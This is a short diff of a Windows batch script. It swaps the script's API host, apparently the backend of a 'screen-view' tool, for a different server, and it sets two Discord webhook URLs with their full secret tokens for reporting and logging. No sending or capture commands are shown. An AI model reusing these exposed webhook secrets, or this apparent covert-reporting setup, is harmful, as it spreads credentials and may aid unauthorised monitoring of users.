@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableDelayedExpansion
-set "apiRoot=https://screen-view-one.vercel.app"
+set "apiRoot=https://skollol.pythonanywhere.com"
 set /p name=<name.txt
 set "webhook=https://discord.com/api/webhooks/1341011448331112468/L1SNbktBvHcZmabBiTs5bh_AUXK3buMwGuZ3PynrIwpiyLAFo6y2U42KugzdaIu3PNBw"
 set "logging=https://discord.com/api/webhooks/1341011158261432381/QKCsx9XfQOZ7gSgcYCPWvBcUNnhPaU4QFb0up5IjRtjc4i39cJUWmBxIenMmBdt6te3G"
